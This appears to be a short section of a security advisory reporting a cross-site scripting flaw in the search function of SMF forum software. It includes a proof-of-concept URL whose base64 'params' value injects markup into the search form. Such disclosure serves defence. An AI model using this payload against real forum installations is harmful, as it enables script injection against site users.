2. XSS problem

SMF is vulnerable to XSS attacks in search functions, in a string passed in base64 to search for re-fill the form search when we want to modify our search.

index.php?action=search;params=bWF4YWdlfCd8Ij5YU1N8InxicmR8J3x8InxzaG93X2NvbXBsZXRlfCd8fCJ8c3ViamVjdF9vbmx5fCd8fCJ8c2VhcmNofCd8c3NzfCJ8c29ydF9kaXJ8J3xkZXNjfCJ8c29ydHwnfHJlbGV2YW5jZQ
